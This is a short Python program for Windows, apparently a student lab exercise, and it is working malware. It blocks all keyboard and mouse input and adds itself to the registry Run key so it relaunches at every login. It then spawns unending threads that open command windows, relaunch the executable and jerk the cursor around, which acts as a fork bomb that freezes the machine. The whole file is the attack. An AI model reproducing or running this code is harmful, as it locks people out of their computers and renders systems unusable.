from ctypes import *
from os import system, path
from pyautogui import moveTo, size
from random import randint
from _thread import start_new_thread
from winreg import *

BlockKey = windll.user32.BlockInput(True)
Screen = size()
PathFile = path.abspath(__file__)[:-2]+'exe'


def Startup():
    StartupKey = OpenKey(HKEY_CURRENT_USER, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run', 0, KEY_ALL_ACCESS)
    SetValueEx(StartupKey, 'laba3', 0, REG_SZ, PathFile)
    CloseKey(StartupKey)

def Fork():
    while True:
        print('BANNED')
        moveTo(randint(0, Screen[0]), randint(0, Screen[1]))
        system('start cmd')
        system('start laba3.exe')


Startup()
while True:
    start_new_thread(Fork, ())
    start_new_thread(Fork, ())
    start_new_thread(Fork, ())

input()